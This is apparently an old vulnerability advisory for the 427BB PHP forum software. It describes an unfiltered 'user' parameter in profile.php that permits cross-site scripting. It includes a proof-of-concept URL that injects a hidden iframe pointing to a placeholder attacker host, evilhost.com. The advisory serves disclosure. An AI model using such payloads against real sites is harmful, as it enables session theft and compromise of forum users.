 Vulnerable: 427BB (Any Version)  
  
  
 ---  
  
 General Information:  
  
 427BB Is a simple board and I have no idea why I'm 
releasing this because Its Very unpopular But I said 
What the hell. Its based on PHP And MySQL  
  
 ---  
  
 Description:  
  
 In profile.php there is a user var that is 
vulnerable to a XSS attack by a remote attacker. The 
user string isn't filtered of < > or ". This makes is 
very easy for a attacker to steal a session and many 
other things.  
  
 ---  
  
 PoC Code  
 Place the following code into the the url then 
reload the profile page and it will execute this 
code.  
  
 profile.php?user=%3Ciframe%20src=http://www.evilhost.com%20height=1%20width=1%3E%3C/iframe%3E  
  
 This is very unsafe and vuln because you can execute 
any code you would like and can lead to manger damage 
of the forum you are attacking.
